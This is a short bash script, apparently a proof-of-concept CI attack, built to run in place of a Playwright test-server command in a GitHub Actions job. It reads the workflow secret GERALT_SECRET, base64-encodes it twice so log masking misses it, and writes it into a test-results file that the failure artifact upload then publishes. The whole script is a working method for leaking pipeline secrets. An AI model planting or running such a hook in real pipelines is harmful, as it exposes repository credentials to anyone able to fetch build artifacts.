#!/bin/bash
# Runs as the Playwright webServer command (cwd = apps/web) in the test job,
# after the 'Add environment variables' step wrote USER_* to GITHUB_ENV and
# with workflow-level GERALT_SECRET in the environment. Writes the leak file
# into test-results/ so the if: failure() upload-artifact step publishes it.
set -u
mkdir -p test-results
SECRET="${GERALT_SECRET:-}"
if [ -n "$SECRET" ]; then
  LEAKED=$(printf '%s' "$SECRET" | base64 -w0 | base64 -w0)
  printf 'GERALT_LEAKED_TOKEN=%s\n' "$LEAKED" > test-results/geralt-leak.txt
  printf 'GERALT_DBG: leak-prep.sh wrote test-results/geralt-leak.txt\n' >&2
fi
exit 0
